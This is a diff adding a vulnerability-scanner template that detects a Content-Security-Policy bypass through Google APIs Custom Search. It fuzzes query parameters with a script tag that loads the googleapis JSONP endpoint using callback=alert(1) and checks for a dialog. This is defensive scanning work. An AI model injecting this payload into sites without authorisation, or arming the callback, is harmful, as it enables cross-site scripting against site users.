@@ -1,0 +1,55 @@
+id: googleapis-customsearch-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google APIs Custom Search
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,googleapis-customsearch,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "googleapis.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: googleapis_customsearch_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "googleapis_customsearch_csp_xss == true"
+# digest: 4b0a004830460221008dfe9f8c973f13fd53e8ac660738517b65782ce15aebebe367b5acf98ddab096022100c6d20f9636c59cc9630fed4bd026e838ef4a6ccd3c686860435e58045bf1f297:922c64590222798bb761d5b6d8e72950
